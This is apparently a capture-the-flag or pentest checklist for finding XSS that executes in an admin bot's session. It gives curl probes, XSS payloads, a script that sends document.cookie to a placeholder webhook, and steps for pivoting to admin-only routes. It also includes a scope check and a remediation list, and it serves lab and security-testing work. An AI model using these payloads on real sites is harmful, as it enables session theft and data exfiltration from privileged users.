# Admin Bot XSS Recon Checklist

## Goal

Find reflected/stored XSS that executes in an admin or support bot session and exfiltrate privileged data with minimal proof.

## 1. Scope Confirmation

- Confirm the target is a lab, owned app, in-scope target, or defensive review.
- Record the target host and time.
- Avoid copying live secrets, tokens, flags, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Bot/report feature:
```

## 2. Map Reflection And Bot Features

Look for:

- repeated phrases / transcription / preview text
- search or echo parameters
- report URL / send to admin / share with moderator forms
- support preview or link checker endpoints

Record:

```text
Reflected parameter/field:
Bot endpoint:
Bot URL restrictions:
Same-origin required: yes/no
```

## 3. Identify Output Context

Fetch a normal value and a markup probe:

```bash
curl -sS -G "https://[host]/" --data-urlencode "q=test"
curl -sS -G "https://[host]/" --data-urlencode "q=<b>test</b>"
curl -sS -G "https://[host]/" --data-urlencode "q=<img src=x onerror=alert(1)>"
```

Record:

```text
Context: HTML text / attribute / JS / URL
Encoded: yes/no
Working tags/handlers:
CSP present: yes/no
```

## 4. Test Bot URL Policy

```bash
curl -sS -X POST "https://[host]/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[host]/?q=test"}'
```

Also test:

```text
external domain
127.0.0.1
path outside allowlist
http vs https
```

Record:

```text
Accepted URL pattern:
Rejected URL pattern:
Useful error text:
```

## 5. Build Same-Origin XSS URL

Start with simple proof:

```html
<img src=x onerror=alert(1)>
<script>alert(1)</script>
<svg/onload=alert(1)>
```

Then move to exfil:

```html
<script>fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))</script>
```

Record:

```text
Final payload:
Final URL:
Execution confirmed locally: yes/no
```

## 6. Exfiltrate Minimal Impact Data

Preferred order:

1. `document.cookie`
2. admin-only fetch/XHR to known endpoints
3. DOM content visible only to admin
4. screenshot or secondary callbacks only if needed

Use a disposable webhook/collaborator outside reusable notes.

Record:

```text
Exfil method:
Data received:
Redacted summary:
```

## 7. Check Cookie And CSP Limits

Determine whether failure is due to:

- `HttpOnly` cookies
- CSP blocking inline script
- bot timeout
- malformed report URL

If cookies are HttpOnly, pivot to in-browser fetch of admin-only routes.

Record:

```text
HttpOnly likely: yes/no
CSP bypass needed: yes/no
Fallback path:
```

## 8. Confirm Root Cause

Separate issues clearly:

```text
Reflected input reached HTML unsafely.
Admin bot visited attacker-controlled same-origin page.
Sensitive cookie was readable from JavaScript.
```

## 9. Fix Checklist

- Encode reflected output by context.
- Use safe rendering APIs.
- Set HttpOnly on sensitive cookies.
- Restrict bot browsing and isolate bot sessions.
- Add CSP and bot/report regression tests.

## 10. Decision Checklist

- [ ] Reflection point identified.
- [ ] HTML execution confirmed.
- [ ] Bot/report URL policy understood.
- [ ] Same-origin XSS URL built.
- [ ] Admin bot triggered successfully.
- [ ] Sensitive data exfiltrated with minimal proof.
- [ ] Root cause and impact documented.
- [ ] Reusable notes exclude live secrets, tokens, and flags.
